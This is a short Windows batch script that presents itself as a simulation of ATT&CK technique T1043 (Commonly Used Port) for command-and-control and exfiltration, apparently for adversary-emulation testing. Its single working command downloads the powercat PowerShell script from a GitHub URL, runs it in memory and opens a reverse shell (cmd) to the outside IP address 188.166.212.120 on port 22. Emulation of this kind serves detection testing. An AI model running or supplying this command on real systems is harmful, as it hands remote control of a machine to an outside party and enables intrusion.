@ECHO OFF
CLS
color 0E


ECHO ============================================================
ECHO Technique: Commonly Used Port (T1043)
ECHO.
ECHO [+] Simulates use of common ports for C2 and Exfil activity
ECHO ------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -c 188.166.212.120 -p 22 -e cmd -v; $m
ECHO.

